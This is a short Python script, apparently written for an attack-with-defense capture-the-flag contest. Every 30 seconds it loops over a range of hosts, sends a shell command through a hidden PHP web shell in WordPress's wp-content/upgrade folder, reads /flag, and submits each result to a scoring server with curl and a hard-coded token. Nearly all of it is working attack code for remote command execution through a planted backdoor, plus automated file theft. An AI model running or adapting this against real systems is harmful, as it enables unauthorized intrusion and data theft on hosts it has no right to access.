import requests
import re
import os
from time import sleep

url = 'http://172.16.5.{}:5074/wp-content/upgrade/.web01.php?guo=d1and3ngzh3'
url2 = 'http://172.16.5.{}:5074/wp-content/upgrade/.web.php?guo=d1and3ngzh3'
post_url = 'https://172.16.4.1/Common/awd_sub_answer'
token = 'e7a8b2d8e7356e5b1e9eacd358201654'
payload = {'power': 'echo `cat /flag`;'}

while True:
    cnt = 0
    for i in range(10, 72):
        try:
            u = url.format(i)
            r = requests.post(u, data=payload, timeout=(1, 1))
            flag = re.search('........-....-....-....-............', r.text).group()
            os.system('curl -k {} -d "token={}&answer={}"'.format(post_url, token, flag))
            print(flag)
            cnt += 1
        except Exception as e:
            print('i={}'.format(i))
            print(e)
    print(cnt)
    sleep(30)
